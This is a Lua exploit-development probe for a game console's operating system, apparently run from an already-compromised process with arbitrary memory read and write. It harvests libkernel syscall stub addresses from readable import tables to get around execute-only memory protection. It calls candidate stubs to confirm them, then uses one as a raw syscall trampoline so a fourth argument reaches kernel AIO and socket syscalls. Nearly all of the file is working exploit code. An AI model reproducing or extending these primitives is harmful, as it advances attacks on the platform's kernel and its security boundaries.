-- CRASH_CLASS: MEDIUM (probes libkernel stub addresses taken from readable import tables)
-- PROBE 1213a: harvest libkernel stub offsets from readable import tables, and find a >=4-arg
--              trampoline so that syscall argument 4 (r10) finally arrives in the kernel.
--
-- Why: syscall.lua:26-28 sets syscall_address = *libc_gettimeofday_import + 7, i.e. the
-- "0f 05" byte of libkernel's 2-argument gettimeofday stub. A 2-arg stub has no
-- "mov r10, rcx", so every syscall made through it gets a stale r10 as argument 4.
-- A >=4-arg stub has the layout  48 c7 c0 <imm32> | 49 89 ca | 0f 05 | c3, so jumping at
-- stub+7 executes exactly "mov r10, rcx; syscall; ret" and leaves rax alone: that is a
-- generic trampoline for any syscall number and any argument 4.
--
-- libkernel .text cannot be read (PKU, docs/EXEC_ONLY_LIBKERNEL_14_10.md), but the ADDRESSES
-- of its stubs sit in plain readable data: the import slots of libc / eboot. This probe reads
-- those tables, keeps every qword inside the libkernel text range, and reports the offsets.
-- Nothing here guesses an address: every candidate tested for execution came out of a table.

print("=== PROBE 1213a: libkernel stub harvest + r10 trampoline ===")

local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function hexn(a) local hi=math.floor(a/4294967296) return string.format("0x%08X%08X",hi,a-hi*4294967296) end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rq(a) local ok,v=pcall(function() return N(memory.read_qword(a)) end) if ok then return v end return nil end

local pid0 = N(mk(20)())
local lk   = N(libkernel_base)
local eb   = N(eboot_base)
local lc   = N(libc_base)
local imp  = N(libc_addrofs.gettimeofday_import)
print(string.format("[0] pid=%d libkernel=%s eboot=%s libc=%s gt_import=%s", pid0, hexn(lk), hexn(eb), hexn(lc), hexn(imp)))
print(string.format("[0] *import = %s   (that + 7 is what every probe so far has been calling)", hexn(rq(imp) or 0)))

-- ---------------------------------------------------------------- module info dump
local mi = memory.alloc(0x300)
local gmi = fcall(libc_addrofs.sceKernelGetModuleInfoFromAddr)
local rv = gmi(eboot_base, 1, mi):tonumber()
print(string.format("[0] GetModuleInfoFromAddr(eboot) = 0x%X", rv))
for off = 0x100, 0x1A0, 0x8 do
    local v = rq(mi + off)
    if v then print(string.format("      mi+0x%03X = %s", off, hexn(v))) end
end

-- ---------------------------------------------------------------- harvest
local seen, order = {}, {}
local function harvest(lo, size, tag, cap)
    local scanned = 0
    local off = 0
    while off < size and scanned < cap do
        local want = math.min(0x8000, size - off)
        local ok, buf = pcall(function() return memory.read_buffer(lo + off, want) end)
        if not ok then
            print(string.format("  [%s] read failed at +0x%X, stopping this window", tag, off))
            return
        end
        local i = 1
        while i + 7 <= want do
            local q = N(uint64.unpack(buf:sub(i, i + 7)))
            if q >= lk and q < lk + 0x100000 then
                local o = q - lk
                if not seen[o] then seen[o] = 0 order[#order + 1] = o end
                seen[o] = seen[o] + 1
            end
            i = i + 8
        end
        scanned = scanned + want
        off = off + want
    end
    print(string.format("  [%s] scanned 0x%X bytes of %s, %d distinct libkernel offsets so far",
          tag, scanned, hexn(lo), #order))
end

-- libc: the import table around the one slot we already know
harvest(imp - 0x2000, 0x4000, "libc", 0x4000)

-- eboot: whole data segments as reported by the module info
for k = 0, 3 do
    local base = rq(mi + 0x160 + 0x10 * k)
    local size = rq(mi + 0x168 + 0x10 * k)
    if base and size and size > 0 and size <= 0x2000000 and base >= 0x10000 then
        print(string.format("  [seg%d] base=%s size=0x%X", k, hexn(base), size))
        if base ~= eb then harvest(base, size, "seg" .. k, 0x200000) end
    end
end

-- ---------------------------------------------------------------- report
table.sort(order)
print(string.format("[1] %d distinct libkernel offsets referenced from readable data", #order))
local line = ""
for i = 1, #order do
    if order[i] < 0x3000 then
        line = line .. string.format("%X ", order[i])
        if #line > 150 then print("    " .. line) line = "" end
    end
end
if #line > 0 then print("    " .. line) end

local buckets = {}
for i = 1, #order do
    local b = math.floor(order[i] / 0x1000)
    buckets[b] = (buckets[b] or 0) + 1
end
local bl = {}
for b, c in pairs(buckets) do bl[#bl + 1] = string.format("%X:%d", b * 0x1000, c) end
table.sort(bl)
print("[1] page histogram (page:count) " .. table.concat(bl, " "))

-- ---------------------------------------------------------------- arity test
-- A candidate is only tested when it came out of an import table AND sits in the same
-- 0x2000 region as gettimeofday (0x%X), so a wrong guess stays inside the stub page.
print("[2] getpid through candidate+7 (a real stub answers with our pid)")
local good = {}
for i = 1, #order do
    local o = order[i]
    if math.abs(o - 0xB50) <= 0x1800 then
        local ok, v = pcall(function() return N(native.fcall_with_rax(lk + o + 7, 20)) end)
        local tag = "?"
        if ok and v == pid0 then tag = "STUB" if #good < 24 then good[#good + 1] = o end end
        print(string.format("   off=0x%04X +7 -> ok=%s pid=%s %s", o, tostring(ok), tostring(v), tag))
    end
end

-- ---------------------------------------------------------------- the payoff test
if #good == 0 then print("[3] no verified stub in range; nothing to test"); print("=== DONE ===") return end

local sv = memory.alloc(8) wd(sv, 0) wd(sv + 4, 0)
mk(135)(uint64(1), uint64(1), uint64(0), uint64(sv))
local fd0, fd1 = rd(sv), rd(sv + 4)
print(string.format("[3] socketpair fds = %d, %d", fd0, fd1))
if fd0 <= 0 then print("[3] no socketpair"); print("=== DONE ===") return end

local buf = memory.alloc(0x100)
local ba = 0
do local ok, v = pcall(function() return N(uint64(buf)) end) if ok then ba = v end end
if ba == 0 then ba = N(buf) end
print(string.format("[3] scratch buffer at %s", hexn(ba)))
local reqs = memory.alloc(0x28 * 2)
local ids  = memory.alloc(16)
local out  = memory.alloc(16)
local tb   = memory.alloc(8)

local function arm()
    for i = 0, 0x28 * 2 - 1, 4 do wd(reqs + i, 0) end
    for i = 0, 1 do
        local r = reqs + i * 0x28
        wd(r + 0x08, 0x10)
        wd(r + 0x10, ba % 4294967296) wd(r + 0x14, math.floor(ba / 4294967296))
        wd(r + 0x20, fd0)
    end
    wd(ids, 0) wd(ids + 4, 0)
    mk(669)(uint64(0x1001), uint64(reqs), uint64(2), uint64(3), uint64(ids))
    return rd(ids), rd(ids + 4)
end

wd(tb, 2000)
print("[3] baseline through the stock 2-arg stub (expect errno 22 EINVAL, arg4 never arrived)")
local a0, b0 = arm()
wd(ids, a0) wd(ids + 4, b0)
mk(663)(uint64(ids), uint64(2), uint64(out), uint64(0), uint64(tb))
print("    err=" .. ES())

for i = 1, #good do
    local o = good[i]
    local a, b = arm()
    wd(ids, a) wd(ids + 4, b)
    local ok = pcall(function() return native.fcall_with_rax(lk + o + 7, 663, ids, 2, out, 0, tb, 0) end)
    local e = ES()
    print(string.format("[3] trampoline off=0x%04X mode=0 count=2 ok=%s err=%s out0=%08X out1=%08X",
          o, tostring(ok), e, rd(out), rd(out + 4)))
    if ok and not e:match("^22 ") and not e:match("^22$") then
        print(string.format("[3] *** ARG4 ARRIVED at off=0x%04X ***", o))
        local a2, b2 = arm()
        wd(ids, a2) wd(ids + 4, b2)
        pcall(function() return native.fcall_with_rax(lk + o + 7, 663, ids, 2, out, 1, tb, 0) end)
        print("    mode=1 control err=" .. ES())
        break
    end
end

print("=== DONE ===")
